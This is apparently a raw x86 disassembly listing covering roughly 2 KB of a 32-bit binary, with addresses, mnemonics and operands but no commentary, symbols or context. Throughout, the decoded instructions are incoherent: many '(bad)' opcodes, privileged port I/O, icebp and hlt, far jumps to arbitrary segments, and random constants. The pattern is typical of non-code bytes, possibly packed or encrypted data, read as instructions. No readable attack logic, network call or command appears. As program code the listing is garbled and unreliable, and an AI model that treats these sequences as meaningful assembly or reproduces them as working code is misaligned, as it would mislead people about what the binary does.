  42e640:	int    0xef
  42e642:	(bad)  
  42e643:	loopne 0x42e619
  42e645:	fild   DWORD PTR [ebx]
  42e647:	fcmovnb st,st(5)
  42e649:	ffree  st(5)
  42e64b:	or     bl,cl
  42e64d:	add    eax,DWORD PTR [ebx]
  42e64f:	repz icebp 
  42e651:	in     al,dx
  42e652:	int    0xac
  42e654:	out    dx,al
  42e655:	in     eax,dx
  42e656:	test   al,0xb2
  42e658:	out    0xd1,eax
  42e65a:	(bad)  
  42e65b:	stc    
  42e65c:	icebp  
  42e65d:	int3   
  42e65e:	shr    edi,cl
  42e660:	aad    0xd3
  42e662:	(bad)  
  42e664:	jmp    0x42e626
  42e666:	jmp    0x42e66b
  42e668:	fmul   DWORD PTR [esi]
  42e66a:	vpaddd ymm4,ymm2,ymm5
  42e66e:	dec    bl
  42e670:	mov    edi,0xcff5e1e5
  42e675:	shl    eax,cl
  42e677:	clc    
  42e678:	repnz (bad) 
  42e67a:	mov    eax,0xd1f7cecc
  42e67f:	mov    ebp,0xecdce6e2
  42e684:	in     eax,0xeb
  42e686:	in     al,0x4
  42e688:	(bad)
  42e68b:	out    0xe3,eax
  42e68d:	fld    st(4)
  42e68f:	(bad)  
  42e691:	ffreep st(1)
  42e693:	mov    bl,0xc9
  42e696:	(bad)  
  42e697:	jmp    0x42e698
  42e699:	aad    0xd2
  42e69b:	fcomip st,st(3)
  42e69d:	retf   0xecfc
  42e6a0:	cli    
  42e6a1:	out    0x0,eax
  42e6a3:	fdiv   st(2),st
  42e6a5:	stc    
  42e6a6:	retf   
  42e6a7:	jmp    0x7fc:0xe5e0d401
  42e6ae:	push   es
  42e6af:	mov    esp,0xd3f7d3e0
  42e6b4:	mov    esp,0xf0f4f1b2
  42e6b9:	lods   eax,DWORD PTR ds:[esi]
  42e6ba:	mov    edi,0xbabedef3
  42e6bf:	ror    bh,cl
  42e6c1:	mov    ebp,0xf9bdc2d4
  42e6c6:	mov    eax,0xf80b0502
  42e6cb:	fcmovnu st,st(0)
  42e6cd:	into   
  42e6ce:	shr    bh,0xc1
  42e6d1:	int    0xc5
  42e6d3:	leave  
  42e6d4:	loop   0x42e6b8
  42e6d6:	mov    dl,0xfa
  42e6d8:	imul   al
  42e6da:	in     eax,dx
  42e6db:	in     al,0xef
  42e6dd:	repz mov ebx,0xcd03c1d7
  42e6e3:	fcmovb st,st(6)
  42e6e5:	mov    ebx,0xb0bd6e7
  42e6eb:	jecxz  0x42e6ba
  42e6ed:	call   ebx
  42e6ef:	mov    bl,0xaf
  42e6f1:	mov    bh,0xe2
  42e6f3:	scas   al,BYTE PTR es:[edi]
  42e6f4:	int3   
  42e6f5:	test   eax,0xc5c0f4c4
  42e6fa:	fdivrp st(5),st
  42e6fc:	fucomp st(3)
  42e6fe:	shr    ebp,cl
  42e700:	hlt    
  42e701:	add    cl,bh
  42e703:	dec    DWORD PTR [ebx]
  42e705:	jmp    0x42e6eb
  42e707:	std    
  42e708:	jmp    0xddee:0xffdfec7
  42e70f:	fcomp  st(0)
  42e711:	in     eax,0xae
  42e713:	ret    0xe4eb
  42e716:	retf   
  42e717:	loopne 0x42e712
  42e719:	mov    ch,0xcc
  42e71b:	mov    esi,0xc1dbeee4
  42e720:	in     al,dx
  42e721:	mov    ebp,0x2c5c005
  42e726:	icebp  
  42e727:	loop   0x42e705
  42e729:	loopne 0x42e734
  42e72b:	clc    
  42e72c:	jmp    0xe502ba31
  42e731:	shr    DWORD PTR [esi+eiz*8-0x101a054d],1
  42e738:	lds    edi,FWORD PTR [eax-0x13040b2e]
  42e73e:	repz repnz xlat BYTE PTR ds:[ebx]
  42e741:	rcr    cl,cl
  42e743:	loopne 0x42e738
  42e745:	lock frndint 
  42e748:	fcomp  st(6)
  42e74a:	cmc    
  42e74b:	leave  
  42e74c:	in     eax,0x2
  42e74e:	in     al,dx
  42e74f:	lods   eax,DWORD PTR ds:[esi]
  42e750:	les    ebp,FWORD PTR [ebp-0x33185458]
  42e756:	repnz jmp 0xefdf:0xc9d1f0f8
  42e75e:	lock test BYTE PTR [ebx],0xd2
  42e762:	int    0xfd
  42e764:	icebp  
  42e765:	or     cl,bl
  42e767:	loop   0x42e761
  42e769:	cld    
  42e76a:	inc    ch
  42e76c:	jmp    0x42e74f
  42e76e:	or     al,0xc2
  42e770:	test   esi,0xd4d5eff3
  42e776:	rcl    cl,1
  42e778:	sar    DWORD PTR [eax-0x471b2f4a],1
  42e77e:	fucomi st,st(1)
  42e780:	sar    ebx,cl
  42e782:	fiadd  DWORD PTR [ecx]
  42e784:	(bad)  
  42e786:	(bad)  
  42e787:	xlat   BYTE PTR ds:[ebx]
  42e788:	aad    0xf9
  42e78a:	loope  0x42e776
  42e78c:	out    0x8,al
  42e78e:	out    0xbf,al
  42e790:	in     eax,0xd7
  42e792:	shr    DWORD PTR [edi-0x111a3e37],1
  42e798:	out    dx,eax
  42e799:	call   0xc9f8d479
  42e79e:	in     al,dx
  42e79f:	ret    0xecef
  42e7a2:	lock ffreep st(6)
  42e7a5:	jmp    0x42e7ae
  42e7a7:	(bad)  
  42e7a8:	retf   0xcad4
  42e7ab:	or     eax,esp
  42e7ad:	jmp    0x42e7b7
  42e7af:	rcr    esp,1
  42e7b1:	in     eax,dx
  42e7b2:	xlat   BYTE PTR ds:[ebx]
  42e7b3:	imul   eax
  42e7b5:	lods   al,BYTE PTR ds:[esi]
  42e7b6:	hlt    
  42e7b7:	aad    0xc8
  42e7b9:	in     al,dx
  42e7ba:	out    0xef,al
  42e7bc:	into   
  42e7bd:	(bad)  
  42e7be:	mov    eax,0xd701fdfc
  42e7c3:	repz xlat BYTE PTR ds:[ebx]
  42e7c5:	in     eax,0xca
  42e7c7:	rcr    ecx,1
  42e7c9:	jmp    0xa7d3:0x130aea05
  42e7d0:	mov    dl,0xb1
  42e7d2:	out    0xc4,eax
  42e7d4:	test   edi,0xf6cfe7d3
  42e7da:	rcl    ebp,cl
  42e7dc:	jmp    0xce2cb79e
  42e7e1:	out    dx,al
  42e7e2:	mov    ah,0xfa
  42e7e4:	or     ebp,ebx
  42e7e6:	retf   
  42e7e7:	jmp    ecx
  42e7e9:	fstp   st(1)
  42e7eb:	ret    
  42e7ec:	out    0x1,eax
  42e7ee:	jmp    0xd314d7d5
  42e7f3:	in     al,0xca
  42e7f5:	aad    0xda
  42e7f7:	jmp    0x42e7dd
  42e7f9:	enter  0xd3be,0xea
  42e7fd:	mov    edi,0xc3c8defa
  42e802:	shl    ah,cl
  42e804:	rcr    eax,0xdd
  42e807:	push   es
  42e808:	(bad)  
  42e80a:	out    dx,eax
  42e80b:	iret   
  42e80c:	fadd   DWORD PTR [eax]
  42e80e:	leave  
  42e80f:	mov    ecx,0xc3b3f6c4
  42e814:	(bad)  
  42e815:	mov    bl,0xe5
  42e817:	mov    ah,0xcf
  42e819:	in     eax,0xfa
  42e81b:	mov    edx,0xdafad0d6
  42e820:	not    al
  42e822:	hlt    
  42e823:	shr    bl,cl
  42e825:	jmp    0x42e7df
  42e827:	jmp    0xee1fea08
  42e82c:	fxch   st(3)
  42e82e:	loope  0x42e820
  42e830:	mov    ebp,0xf2d0bce0
  42e835:	mov    ebx,0xe8ccd5b3
  42e83a:	hlt    
  42e83b:	mov    ch,0xeb
  42e83d:	xlat   BYTE PTR ds:[ebx]
  42e83e:	ret    
  42e83f:	loop   0x42e822
  42e841:	(bad)  
  42e842:	mov    ebp,0xf8cb0bd9
  42e847:	call   0xeb27c52f
  42e84c:	fmul   DWORD PTR [edi]
  42e84e:	int    0xbd
  42e850:	test   al,0xe8
  42e852:	cmc    
  42e853:	iret   
  42e854:	shr    esi,0xc2
  42e857:	out    dx,eax
  42e858:	shl    DWORD PTR [edi-0x7343709],1
  42e85e:	out    dx,eax
  42e85f:	mov    ebx,0xf6fdfde1
  42e864:	ror    BYTE PTR [ebx],1
  42e866:	xlat   BYTE PTR ds:[ebx]
  42e867:	(bad)  
  42e868:	fimul  DWORD PTR [edx]
  42e86a:	or     ch,al
  42e86c:	loope  0x42e86c
  42e86e:	in     eax,dx
  42e86f:	out    0xcc,al
  42e871:	in     al,dx
  42e872:	into   
  42e873:	test   ch,0xad
  42e876:	retf   
  42e877:	stc    
  42e878:	jmp    0xc2bf:0xcdebcbfe
  42e87f:	mov    edi,0xc6c0f4f9
  42e884:	aad    0xe3
  42e886:	std    
  42e887:	or     DWORD PTR [eax],ecx
  42e889:	loopne 0x42e873
  42e88b:	out    0xe8,eax
  42e88d:	iret   
  42e88e:	or     eax,0xbef3a8ad
  42e893:	in     al,0xce
  42e895:	(bad)  
  42e896:	int    0xb4
  42e898:	mov    cl,0xde
  42e89a:	shl    ah,1
  42e89c:	repnz sti 
  42e89e:	retf   0xe2df
  42e8a1:	into   
  42e8a2:	clc    
  42e8a3:	std    
  42e8a4:	lock rol DWORD PTR [ecx],1
  42e8a7:	ret    
  42e8a8:	add    dh,dl
  42e8aa:	in     eax,0xb
  42e8ac:	adc    ebx,ecx
  42e8ae:	ror    bl,0xc7
  42e8b1:	not    bl
  42e8b3:	out    dx,al
  42e8b4:	imul   bh
  42e8b6:	(bad)  
  42e8b8:	fdivr  DWORD PTR [ecx-0xa1b2323]
  42e8be:	mov    al,0xe3
  42e8c0:	out    dx,eax
  42e8c1:	rol    edi,0x7
  42e8c4:	xlat   BYTE PTR ds:[ebx]
  42e8c5:	out    0xdc,al
  42e8c7:	stc    
  42e8c8:	call   0xd447cf95
  42e8cd:	adc    ch,cl
  42e8cf:	int    0xc9
  42e8d1:	out    0xed,al
  42e8d3:	ret    
  42e8d4:	fdiv   QWORD PTR [esi-0x1a141650]
  42e8da:	mov    dh,0xc5
  42e8dc:	cli    
  42e8dd:	jmp    0xffdf:0xc2f9cdca
  42e8e4:	in     al,0xf8
  42e8e6:	pop    es
  42e8e7:	add    ah,bh
  42e8e9:	loopne 0x42e8c4
  42e8eb:	or     edx,esp
  42e8ed:	(bad)
  42e8f0:	mov    bl,0xca
  42e8f2:	lods   eax,DWORD PTR ds:[esi]
  42e8f3:	loop   0x42e8b7
  42e8f5:	fucomi st,st(7)
  42e8f7:	mov    al,0xf1
  42e8f9:	iret   
  42e8fa:	enter  0xdfd6,0xca
  42e8fe:	rol    DWORD PTR [edx],cl
  42e900:	icebp  
  42e901:	loop   0x42e903
  42e903:	(bad)  
  42e905:	sti    
  42e906:	cld    
  42e907:	add    al,0xc0
  42e909:	hlt    
  42e90a:	aam    0xe6
  42e90c:	leave  
  42e90d:	into   
  42e90e:	jmp    edx
  42e910:	mov    esi,0xc0c0cabf
  42e915:	repnz int 0xfb
  42e918:	mov    cl,0xdf
  42e91a:	test   bl,0xf3
  42e91d:	in     al,dx
  42e91e:	(bad)  
  42e920:	enter  0xccdf,0xc5
  42e924:	(bad)  
  42e926:	(bad)  
  42e927:	(bad)  
  42e928:	jecxz  0x42e908
  42e92a:	push   cs
  42e92b:	add    bh,dl
  42e92d:	fdiv   st(4),st
  42e92f:	mov    esp,0xcadecfa8
  42e934:	(bad)
  42e938:	out    0xad,eax
  42e93a:	mov    dh,0xd9
  42e93c:	int    0xf2
  42e93e:	fstp   TBYTE PTR [ecx-0x2cfd302f]
  42e944:	(bad)  
  42e945:	out    0xd4,eax
  42e947:	add    eax,0xdcc5c6e0
  42e94c:	iret   
  42e94d:	(bad)  
  42e94f:	(bad)  
  42e950:	fdiv   st,st(3)
  42e952:	scas   eax,DWORD PTR es:[edi]
  42e953:	int    0xc5
  42e955:	(bad)  
  42e956:	out    0xfb,al
  42e958:	call   0xcd2cc70e
  42e95d:	fcmovnbe st,st(7)
  42e95f:	add    eax,DWORD PTR [ecx]
  42e961:	into   
  42e962:	ret    0xd0f3
  42e965:	add    al,dl
  42e967:	call   0x130ab48
  42e96c:	jmp    ebx
  42e96e:	or     DWORD PTR [ebx-0x331b521b],ebp
  42e974:	into   
  42e975:	mov    cl,0xea
  42e977:	out    0xca,al
  42e979:	(bad)  
  42e97a:	shl    DWORD PTR [edi-0x3e332630],cl
  42e980:	in     eax,dx
  42e981:	fucom  st(7)
  42e983:	loope  0x42e964
  42e985:	out    0xd0,al
  42e987:	add    ebx,edi
  42e989:	loope  0x42e981
  42e98b:	jecxz  0x42e993
  42e98d:	sti    
  42e98e:	or     ch,BYTE PTR [ebp-0x4c311b12]
  42e994:	in     al,dx
  42e995:	ror    bl,0xea
  42e998:	jmp    0x42e993
  42e99a:	jmp    0x42e978
  42e99c:	int3   
  42e99d:	mov    eax,0xfff9dabe
  42e9a2:	loope  0x42e9a7
  42e9a4:	fcmovb st,st(0)
  42e9a6:	(bad)  
  42e9a7:	(bad)  
  42e9a8:	in     eax,0xe0
  42e9aa:	jmp    0x42e975
  42e9ac:	clc    
  42e9ad:	clc    
  42e9ae:	fucomip st,st(4)
  42e9b0:	int3   
  42e9b1:	jmp    0xf118cf83
  42e9b6:	mov    dh,0xec
  42e9b8:	int3   
  42e9b9:	(bad)
  42e9bc:	fadd   st,st(3)
  42e9be:	ror    ebp,cl
  42e9c0:	sar    DWORD PTR [esi-0x2a042a41],cl
  42e9c6:	(bad)  
  42e9c7:	loope  0x42e9b4
  42e9c9:	leave  
  42e9ca:	ftst   
  42e9cc:	in     al,dx
  42e9cd:	or     al,0xdf
  42e9cf:	rol    eax,0xef
  42e9d2:	loop   0x42e9a1
  42e9d4:	mov    dh,0xd5
  42e9d6:	mov    dh,0xc1
  42e9d8:	scas   al,BYTE PTR es:[edi]
  42e9d9:	(bad)  
  42e9da:	lock cli 
  42e9dc:	in     al,dx
  42e9dd:	add    bl,bh
  42e9df:	fmul   st,st(0)
  42e9e1:	loopne 0x42e9dd
  42e9e3:	add    ebx,esi
  42e9e5:	cmc    
  42e9e6:	fcmovnu st,st(7)
  42e9e8:	cli    
  42e9e9:	(bad)  
  42e9ea:	(bad)  
  42e9eb:	cmc    
  42e9ec:	aam    0x1
  42e9ee:	or     ah,ch
  42e9f0:	in     al,dx
  42e9f1:	test   al,0xf3
  42e9f3:	(bad)
  42e9f6:	int    0xb0
  42e9f8:	rcr    ecx,1
  42e9fa:	in     al,0xba
  42e9fc:	sar    ch,1
  42e9fe:	rcl    dh,1
  42ea00:	idiv   ch
  42ea02:	shl    cl,1
  42ea04:	ret    
  42ea05:	out    0xda,eax
  42ea07:	in     eax,0xf5
  42ea09:	(bad)  
  42ea0a:	fucomip st,st(7)
  42ea0c:	fimul  DWORD PTR [ebx]
  42ea0e:	cli    
  42ea0f:	test   eax,0xe3d5d7b1
  42ea14:	ret    
  42ea15:	retf   
  42ea16:	xlat   BYTE PTR ds:[ebx]
  42ea17:	iret   
  42ea18:	iret   
  42ea19:	mov    edi,0xbfddf9b7
  42ea1e:	ret    
  42ea1f:	leave  
  42ea20:	hlt    
  42ea21:	sar    ah,cl
  42ea23:	repnz (bad) 
  42ea27:	or     eax,edi
  42ea29:	mov    ebp,0xce08fcd6
  42ea2e:	add    al,0xd9
  42ea30:	ret    0xc3e8
  42ea33:	out    0xeb,eax
  42ea35:	lods   al,BYTE PTR ds:[esi]
  42ea36:	jmp    0x42ea04
  42ea38:	(bad)  
  42ea39:	not    bh
  42ea3b:	(bad)  
  42ea3d:	in     eax,dx
  42ea3e:	cmc    
  42ea3f:	idiv   cl
  42ea41:	loop   0x42ea09
  42ea43:	in     eax,dx
  42ea44:	ret    
  42ea45:	out    0xc1,al
  42ea47:	jmp    0xb38b637
  42ea4c:	add    ch,bh
  42ea4e:	fsubrp st(7),st
  42ea50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea51:	scas   al,BYTE PTR es:[edi]
  42ea52:	shl    DWORD PTR [ebx-0x3134442c],1
  42ea58:	mov    ch,0xe5
  42ea5a:	not    bl
  42ea5c:	mov    ch,0xb4
  42ea5e:	in     eax,dx
  42ea5f:	mov    bh,0xee
  42ea61:	(bad)  
  42ea63:	rcl    ebx,1
  42ea65:	cld    
  42ea66:	sti    
  42ea67:	(bad)  
  42ea68:	inc    BYTE PTR [eax]
  42ea6a:	stc    
  42ea6b:	or     cl,dh
  42ea6d:	fimul  WORD PTR [edi]
  42ea6f:	sar    DWORD PTR [ebp-0x9333809],0xb3
  42ea76:	mov    al,0xc7
  42ea78:	out    dx,al
  42ea79:	in     al,0xfd
  42ea7b:	aad    0xbc
  42ea7d:	fidivr WORD PTR [ebx-0x23112a20]
  42ea83:	loopne 0x42ea56
  42ea85:	jmp    0x42ea83
  42ea87:	(bad)  
  42ea88:	fucomi st,st(2)
  42ea8a:	add    ch,dh
  42ea8c:	into   
  42ea8d:	frndint 
  42ea8f:	out    0xe2,al
  42ea91:	call   0xc924d854
  42ea96:	not    bl
  42ea98:	into   
  42ea99:	mov    ebx,0xf0b5cfee
  42ea9e:	fdivr  DWORD PTR [ebx-0xa0a2648]
  42eaa4:	aad    0xdc
  42eaa6:	or     edi,ebx
  42eaa8:	ud0    edi,DWORD PTR [ecx+ecx*1-0x550c03f5]
  42eab0:	jecxz  0x42ea77
  42eab2:	aad    0xb0
  42eab4:	lock jmp 0xf2e8:0xf9e8bbda
  42eabc:	fst    st(2)
  42eabe:	in     al,dx
  42eabf:	hlt    
  42eac0:	pop    es
  42eac1:	fnclex 
  42eac3:	in     eax,0xcc
  42eac5:	(bad)  
  42eac6:	hlt    
  42eac7:	rcl    ah,0xde
  42eaca:	(bad)  
  42eacc:	repz fsubrp st(7),st
  42eacf:	(bad)
  42ead2:	rol    al,1
  42ead4:	jmp    0xb8e4:0xd6f2e9d4
  42eadb:	fcmove st,st(0)
  42eadd:	repnz repz (bad) 
  42eae1:	into   
  42eae2:	in     al,dx
  42eae3:	rcr    ebx,0xdd
  42eae6:	std    
  42eae7:	std    
  42eae8:	aad    0xdf
  42eaea:	leave  
  42eaeb:	sti    
  42eaec:	loope  0x42eabc
  42eaee:	out    0xee,al
  42eaf0:	in     eax,0xa8
  42eaf2:	mov    ebp,0xcacce8ee
  42eaf7:	out    dx,eax
  42eaf8:	enter  0xedef,0xb5
  42eafc:	add    ebp,ecx
  42eafe:	jmp    0x406bbf7
  42eb03:	lock mov esi,0xe8cbe90b
  42eb09:	in     eax,0xca
  42eb0b:	sti    
  42eb0c:	out    0xeb,al
  42eb0e:	or     edi,DWORD PTR [edi-0x4e414e09]
  42eb14:	lock (bad) 
  42eb16:	loop   0x42eae3
  42eb18:	(bad)  
  42eb19:	mov    ecx,0xbecaffb0
  42eb1e:	cmc    
  42eb1f:	mov    bh,0xc1
  42eb21:	add    edx,edx
  42eb23:	mov    DWORD PTR [ebx+ecx*1],0xfd501fc
  42eb2a:	jmp    0x42eb06
  42eb2c:	jmp    0xadbd:0xd1ad120b
  42eb33:	in     al,dx
  42eb34:	mov    dl,0xe7
  42eb36:	aam    0xd7
  42eb38:	retf   
  42eb39:	(bad)  
  42eb3a:	cli    
  42eb3b:	jmp    0xc02dea0d
  42eb40:	rol    dl,1
  42eb42:	ret    
  42eb43:	xlat   BYTE PTR ds:[ebx]
  42eb44:	add    al,0xfc
  42eb46:	mov    esp,0xebe104da
  42eb4b:	jmp    0x42eb4e
  42eb4d:	fdiv   st(6),st
  42eb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb50:	out    0xc6,eax
  42eb52:	lods   al,BYTE PTR ds:[esi]
  42eb53:	jmp    0x42eb22
  42eb55:	test   eax,0xb1b7d6c7
  42eb5a:	out    dx,al
  42eb5b:	not    bh
  42eb5d:	fdiv   st,st(3)
  42eb5f:	fild   DWORD PTR [edi]
  42eb61:	mov    edi,0xffd9e600
  42eb66:	jmp    0x42eb31
  42eb68:	aam    0xc9
  42eb6a:	add    DWORD PTR [edi],ecx
  42eb6c:	int3   
  42eb6d:	fisttp QWORD PTR [ebx]
  42eb6f:	mov    esi,0xc1ccb0bf
  42eb74:	mov    cl,0xd1
  42eb76:	(bad)  
  42eb77:	repz (bad) 
  42eb79:	mov    al,0xb9
  42eb7b:	in     eax,dx
  42eb7c:	(bad)
  42eb80:	icebp  
  42eb81:	mov    eax,0xe0cce405
  42eb86:	rcl    cl,1
  42eb88:	std    
  42eb89:	test   BYTE PTR ds:0x13fde9c5,0xb9
  42eb90:	int    0xb1
  42eb92:	in     eax,dx
  42eb93:	in     al,0xc0
  42eb95:	(bad)  
  42eb96:	repz lock vpxor xmm6,xmm0,xmm6
  42eb9c:	cli    
  42eb9d:	in     al,dx
  42eb9e:	cmc    
  42eb9f:	std    
  42eba0:	enter  0xfa07,0xf8
  42eba4:	(bad)  
  42eba5:	div    esp
  42eba7:	(bad)  
  42eba8:	out    dx,eax
  42eba9:	or     ecx,edx
  42ebab:	call   0xe823d698
  42ebb0:	in     al,0xea
  42ebb2:	mov    cl,0xae
  42ebb4:	out    0xf7,eax
  42ebb6:	aad    0xef
  42ebb8:	out    0xf4,eax
  42ebba:	retf   0xb2d3
  42ebbd:	loop   0x42eb7c
  42ebbf:	fcomi  st,st(7)
  42ebc1:	mov    ebp,0xc5c7d0d1
  42ebc6:	fdivr  st,st(5)
  42ebc8:	or     ah,al
  42ebca:	add    edi,ebx
  42ebcc:	psubusb mm5,mm3
  42ebcf:	stos   DWORD PTR es:[edi],eax
  42ebd0:	in     eax,dx
  42ebd1:	int3   
  42ebd2:	int    0xe6
  42ebd4:	aam    0xeb
  42ebd6:	mov    edx,0xd2f1c8c0
  42ebdb:	(bad)  
  42ebdd:	repnz neg eax
  42ebe0:	ret    
  42ebe1:	mov    ch,0xbf
  42ebe3:	mov    ebp,0x5d6dcf3
  42ebe8:	cli    
  42ebe9:	add    ebx,esp
  42ebeb:	fcmovnbe st,st(4)
  42ebed:	add    ebp,esi
  42ebef:	jmp    0xd72ca9bb
  42ebf4:	into   
  42ebf5:	mul    cl
  42ebf7:	repz (bad) 
  42ebfa:	hlt    
  42ebfb:	call   0xf734b6be
  42ec00:	fdiv   st,st(5)
  42ec02:	repz std 
  42ec04:	fld    DWORD PTR [eax]
  42ec06:	cmc    
  42ec07:	faddp  st(7),st
  42ec09:	iret   
  42ec0a:	add    dh,ah
  42ec0c:	fiadd  WORD PTR [edi]
  42ec0e:	or     eax,0xebb1cbe9
  42ec13:	iret   
  42ec14:	shl    ebx,1
  42ec16:	mov    dh,0xc6
  42ec18:	dec    ebp
  42ec1a:	in     al,dx
  42ec1b:	shl    dl,cl
  42ec1d:	fmulp  st(5),st
  42ec1f:	in     al,dx
  42ec20:	cli    
  42ec21:	hlt    
  42ec22:	fldlg2 
  42ec24:	idiv   DWORD PTR [ebp-0x1d2b1f3a]
  42ec2a:	add    DWORD PTR [edi],eax
  42ec2c:	leave  
  42ec2d:	into   
  42ec2e:	adc    edi,DWORD PTR [ebp-0x4235301e]
  42ec34:	hlt    
  42ec35:	rol    ah,cl
  42ec37:	mov    dh,0xed
  42ec39:	in     eax,dx
  42ec3a:	aam    0xb4
  42ec3c:	stc    
  42ec3d:	lock mov edx,0xe7c3dbfc
  42ec43:	test   ebp,0xe8c7b8f6
  42ec49:	fld    DWORD PTR [edx]
  42ec4b:	(bad)  
  42ec4c:	call   0xb40af724
  42ec51:	mov    esi,0xb4c8b3d2
  42ec56:	rol    dh,1
  42ec58:	in     al,dx
  42ec59:	in     al,0xb0
  42ec5b:	push   DWORD PTR [edx-0x32212a37]
  42ec61:	add    ah,bl
  42ec63:	(bad)
  42ec66:	add    eax,DWORD PTR [edx]
  42ec68:	loop   0x42ec2e
  42ec6a:	add    eax,DWORD PTR [edi]
  42ec6c:	adc    ecx,DWORD PTR [eax]
  42ec6e:	(bad)  
  42ec70:	retf   
  42ec71:	jmp    0xdbc6:0xc0e8b5e5
  42ec78:	sti    
  42ec79:	sti    
  42ec7a:	(bad)  
  42ec7b:	sti    
  42ec7c:	rcl    ebp,cl
  42ec7e:	iret   
  42ec7f:	(bad)  
  42ec81:	xlat   BYTE PTR ds:[ebx]
  42ec82:	(bad)  
  42ec83:	mov    ebx,0xfbcabdf6
  42ec88:	aam    0xf6
  42ec8a:	clc    
  42ec8b:	or     eax,0xe105cafa
  42ec90:	mov    eax,0xb5f3cae3
  42ec95:	enter  0xbbbb,0xec
  42ec99:	aad    0xd9
  42ec9b:	cld    
  42ec9c:	fdivr  st,st(6)
  42ec9e:	shr    ecx,cl
  42eca0:	mov    dh,0xf2
  42eca2:	add    BYTE PTR [ecx],al
  42eca4:	add    eax,0xd8e60bf2
  42eca9:	fdivr  st,st(3)
  42ecab:	add    eax,0xc7e8e6ea
  42ecb0:	lods   al,BYTE PTR ds:[esi]
  42ecb1:	fmul   st(1),st
  42ecb3:	mov    cl,0xc8
  42ecb5:	leave  
  42ecb6:	shl    eax,1
  42ecb8:	out    0xe6,eax
  42ecba:	mov    esi,0xeffebab7
  42ecbf:	mov    edx,0xf4e1dac2
  42ecc4:	out    0xc5,al
  42ecc6:	std    
  42ecc7:	hlt    
  42ecc8:	retf   
  42ecc9:	loopne 0x42eca4
  42eccb:	into   
  42eccc:	fldl2t 
  42ecce:	std    
  42eccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ecd0:	in     al,0xe7
  42ecd2:	imul   dh
  42ecd4:	ret    
  42ecd5:	shr    BYTE PTR [eax-0x115283b],0xf0
  42ecdc:	std    
  42ecdd:	iret   
  42ecde:	shl    dl,1
  42ece0:	idiv   DWORD PTR [ebx+edx*8-0x2e053bfc]
  42ece7:	(bad)  
  42ece8:	jmp    0x42ecf8
  42ecea:	iret   
  42eceb:	retf   0xfac5
  42ecee:	les    esi,FWORD PTR [edx-0x14223b12]
  42ecf4:	not    ebx
  42ecf6:	iret   
  42ecf7:	stc    
  42ecf8:	out    dx,eax
  42ecf9:	mov    ah,0xfd
  42ecfb:	into   
  42ecfc:	mov    esp,0xbdedd2fa
  42ed01:	int    0xee
  42ed03:	mov    ebx,0x6d1d9d3
  42ed08:	in     eax,0xfe
  42ed0a:	or     ebx,ebp
  42ed0c:	add    eax,DWORD PTR [esi]
  42ed0e:	or     eax,0xc1eeccef
  42ed13:	mov    al,0xc4
  42ed15:	(bad)
  42ed18:	in     al,0xf8
  42ed1a:	fmulp  st(7),st
  42ed1c:	mov    esp,0xdfddffcb
  42ed21:	add    BYTE PTR [edi-0x2a270af9],bh
  42ed27:	rcr    edx,1
  42ed29:	out    0xe7,al
  42ed2b:	out    0xa,eax
  42ed2d:	loope  0x42ed09
  42ed2f:	int3   
  42ed30:	retf   
  42ed31:	lock into 
  42ed33:	repz mov ah,0xb1
  42ed36:	leave  
  42ed37:	(bad)
  42ed3a:	int    0xc4
  42ed3c:	mov    esp,0xbebbc2fa
  42ed41:	mov    ch,0xd4
  42ed43:	std    
  42ed44:	fcomip st,st(6)
  42ed46:	(bad)  
  42ed48:	jmp    0xfad9:0xe0ddd5fa
  42ed4f:	leave  
  42ed50:	retf   
  42ed51:	loope  0x42ecfb
  42ed53:	mov    dl,0xb4
  42ed55:	loop   0x42ed3d
  42ed57:	shl    BYTE PTR [ecx-0x4d401721],1
  42ed5d:	mov    ebp,0xd5d2f9c8
  42ed62:	mov    esi,0xe7f2bafc
  42ed67:	jmp    0x42ed74
  42ed69:	loop   0x42ed4a
  42ed6b:	or     dl,ch
  42ed6d:	loope  0x42ed3d
  42ed6f:	loopne 0x42ed43
  42ed71:	(bad)  
  42ed72:	loope  0x42ed47
  42ed74:	mov    dh,0xb5
  42ed76:	sti    
  42ed77:	in     eax,dx
  42ed78:	mov    ecx,0xcaecffd4
  42ed7d:	mov    edi,0xccf502b8
  42ed82:	mov    eax,0xc5fdd0d4
  42ed87:	(bad)  
  42ed88:	fucomi st,st(6)
  42ed8a:	mul    dh
  42ed8c:	add    eax,ebp
  42ed8e:	icebp  
  42ed8f:	jmp    0x42ed40
  42ed91:	mov    esp,0xd2f0aed7
  42ed96:	cmc    
  42ed97:	mov    cl,0xed
  42ed99:	ror    ebx,1
  42ed9b:	xlat   BYTE PTR ds:[ebx]
  42ed9c:	fcom   st(5)
  42ed9e:	add    DWORD PTR [ecx-0x2fe1d4a],edi
  42eda4:	out    0x6,al
  42eda6:	ror    BYTE PTR [ebx],0x7
  42eda9:	loop   0x42edb9
  42edab:	or     esp,eax
  42edad:	iret   
  42edae:	(bad)  
  42edb0:	test   eax,0xd7c4e3dc
  42edb5:	out    0xd2,al
  42edb7:	mov    edx,0xd1d7b7c5
  42edbc:	jmp    0xba1db192
  42edc1:	not    dl
  42edc3:	fscale 
  42edc5:	mov    ebp,0xf8f7e3e6
  42edca:	enter  0xe1d4,0xcd
  42edce:	repnz stos DWORD PTR es:[edi],eax
  42edd0:	mov    bl,0xc4
  42edd2:	int3   
  42edd3:	int3   
  42edd4:	shl    BYTE PTR [edi-0x34204c49],1
  42edda:	fidivr DWORD PTR [ecx-0x2f0c3303]
  42ede0:	fucomip st,st(4)
  42ede2:	loopne 0x42edb4
  42ede4:	add    al,0xf7
  42ede6:	add    cl,BYTE PTR [ecx]
  42ede8:	(bad)
  42edeb:	or     cl,BYTE PTR ds:0xc9d1e2e4
  42edf1:	mov    bh,0xd1
  42edf3:	mov    dl,0xcb
  42edf5:	(bad)  
  42edf6:	(bad)  
  42edf7:	out    dx,al
  42edf8:	cmc    
  42edf9:	into   
  42edfa:	neg    edi
  42edfc:	cli    
  42edfd:	leave  
  42edfe:	repnz jecxz 0x42edb9
  42ee01:	pop    es
  42ee02:	jecxz  0x42ee03
  42ee04:	fiadd  DWORD PTR ds:0xf9e407d5
  42ee0a:	retf   
  42ee0b:	out    0xdd,al
  42ee0d:	into   
  42ee0e:	repz test al,0xcd
  42ee11:	mov    ebp,0xcdb6eeef
  42ee16:	fcomi  st,st(5)
  42ee18:	fcmove st,st(1)
  42ee1a:	icebp  
  42ee1b:	shr    eax,1
  42ee1d:	mov    ecx,0xd1c2dfec
